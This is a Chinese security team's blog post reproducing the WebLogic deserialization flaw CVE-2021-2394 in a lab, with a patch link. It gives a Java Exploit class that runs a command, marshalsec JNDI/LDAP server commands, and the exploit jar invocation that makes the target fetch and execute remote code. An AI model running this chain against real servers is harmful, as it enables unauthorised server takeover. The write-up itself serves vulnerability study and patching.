<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yTSqoE-p63HR3WhosnbBRw)

**上方蓝色字体关注我们，一起学安全！**

**作者：Xz****@Timeline Sec  
**

**本文字数：815**

**阅读时长：2～3min**

**声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。

**0x02 漏洞概述**  

  

**编号：CVE-2021-2394**  
Oracle 官方发布了 2021 年 7 月份安全更新通告，通告中披露了 WebLogic 组件存在高危漏洞，攻击者可以在未授权的情况下通过 IIOP、T3 协议对存在漏洞的 WebLogic Server 组件进行攻击。成功利用该漏洞的攻击者可以接管 WebLogic Server。  

这是一个二次反序列化漏洞，是 CVE-2020-14756 和 CVE-2020-14825 的调用链相结合组成一条新的调用链来绕过 weblogic 黑名单列表。

**0x03 影响版本**  

  

Oracle WebLogic Server 10.3.6.0.0

Oracle WebLogic Server 12.1.3.0.0

Oracle WebLogic Server 12.2.1.3.0

Oracle WebLogic Server 12.2.1.4.0

Oracle WebLogic Server 14.1.1.0.0

**0x04 环境搭建**  

  

系统环境：window10 系统

weblogic 版本：12.2.1.3, 直接官网下载就可以  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib7k0kz94lY7z2swyxKd1yeicgxDLfWknge4IhxVy9n88mDia01d88DmZ7A/640?wx_fmt=png)

weblogic 安装过程省略，很简单

安装好之后，在此目录启动就可以

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\startWebLogic.cmd
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib7hIOibcViavtkw2444F6E8R3YgAEaqbvmW4YLBpZFLV2VZ0FhMS7OVhug/640?wx_fmt=png)

weblogic 启动成功的截图

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib7ZWiafXtUdsoyJ86oHvaamJoU6vBhSYsapM1piaSzXYWKCyDPo92Snia9A/640?wx_fmt=png)  

**0x05 漏洞复现**  

  

1、下载 marshalsec 利用 marshalsec 开启 JNDI 服务

```
https://github.com/mbechler/marshalsec # 需要自己编译
mvn clean package –DskipTests

https://github.com/RandomRobbieBF/marshalsec-jar # 可以直接使用
```

2、创建 Exploit.java，通过 javac 编译得到 Exploit.class     

```
public class Exploit {

    static {
        System.err.println("Pwned");
        try {
            String cmds = "calc";
            Runtime.getRuntime().exec(cmds);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
```

3、在同目录下使用 python 开启一个 http 服务，并使用 marshalsec 开启 JNDI 服务

```
python -m http.server 8000
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit" 8087
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib7KMQCrfC3iaPrfzhicQDkzaauM9TO8wT7aqOwjM7vRScdoVwDVK3VybBQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib7tXG3Re9XjElCePiaoGyeicicDbxIAuibxoicQOhGafVHEJuLRrianKIjUXPQ/640?wx_fmt=png)  

4、利用我们组 lz2y 大佬写的 exp 进行复现

```
https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0
```

```
java -jar CVE_2021_2394.jar 192.168.31.3 7001 ldap://192.168.3.35:8087/Exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib74qR2As3NqqtNTHKBSSS3uWBELR4ewfePmDRLcm00B1Tq79ZfWoSxxA/640?wx_fmt=png)

  
目标机成功弹框

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaN9OUPxh6EWuVnATGx2qib75nkv2Se4G7HC2fBoicLBhAkcnkCCH9HaxB9nPLy45mwhwWzIXQDIsJA/640?wx_fmt=png)

**0x06 修复方式**  

  

当前官方已发布受影响版本的对应补丁，建议受影响的用户及时更新官方的安全补丁。链接如下：

https://www.oracle.com/security-alerts/cpuapr2021.html

```
参考链接：
```

https://github.com/lz2y/CVE-2021-2394/  

https://mp.weixin.qq.com/s/wFHhWvnCLm1xcWZIbv6O3A

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjfVYbYbk6BjOPiaXs1pyWjPuTA8oia9G1iaHtnmJwXZhFwbsnckxIqhPztSW0ejymQ6M5fmpzqPz4rw/640?wx_fmt=png)

**往期回顾**  

  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVsiax5APibMPibicjtyibHBAP8Lpdav4NW1Ah7Rw0ElTbAwd1ZzUwGJFRXwzkia917dfMBUWy28icZVibliaJGA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247487675&idx=1&sn=736d0216bca8525981a4ff66dc6e4887&chksm=9039364ba74ebf5d1d1a594f21967c78c6530641eff23efcee4ce922ce85a847e9acae3af7e1&scene=21#wechat_redirect)  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr1OBdofQYcuBrlODmRGBVteRg33zjem22aZoJcicEf9cqotOVllZfibYA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247486827&idx=1&sn=cd5e393a098627257dffedf500eb2509&chksm=90392b9ba74ea28d4fa4473c175d3842723e1f3d3d1786dbed9fa0fbb6f4394138933caf541c&scene=21#wechat_redirect)  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshwUL3uf6a5yba2FZGmGc5kLWibCXxzZ6YQcQiaUdTziaab8WPrCmG8Ibr8gPiaoHGbqichYPVicUXv6c7Q/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247486336&idx=1&sn=2a054ededbc855622fe2ac6c8906aae0&chksm=90392d70a74ea46635bef3cd4fc414cef87d16a1875ccb690f6eadb4304337e0d2b4772a2659&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行